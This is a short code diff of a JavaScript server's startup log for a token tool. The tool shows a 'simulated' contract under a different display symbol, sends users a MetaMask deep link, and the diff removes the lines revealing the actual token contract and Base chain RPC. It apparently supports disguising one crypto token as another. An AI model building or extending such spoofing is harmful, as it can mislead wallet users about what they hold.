-  console.log("Token Display: " + TOKEN_CONFIG.actualSymbol + " → " + TOKEN_CONFIG.displaySymbol);
+  console.log("Token Display: STBL → " + TOKEN_CONFIG.displaySymbol);
   console.log("Network: " + TOKEN_CONFIG.networkName + " (" + TOKEN_CONFIG.networkId + ")");
   console.log("Simulated Contract: " + TOKEN_CONFIG.address);
-  console.log("Actual Token Contract: " + TOKEN_CONFIG.actualTokenAddress);
   console.log("Decimals: " + TOKEN_CONFIG.decimals);
   console.log("API Health Check: http://localhost:" + port + "/api/token-info");
   console.log("MetaMask Deep Link: metamask://wallet/asset?address=" + TOKEN_CONFIG.address + "&chainId=1");
-  console.log("Base Chain RPC: " + TOKEN_CONFIG.actualChainRpcUrl);
   console.log("======================================");
 });
 
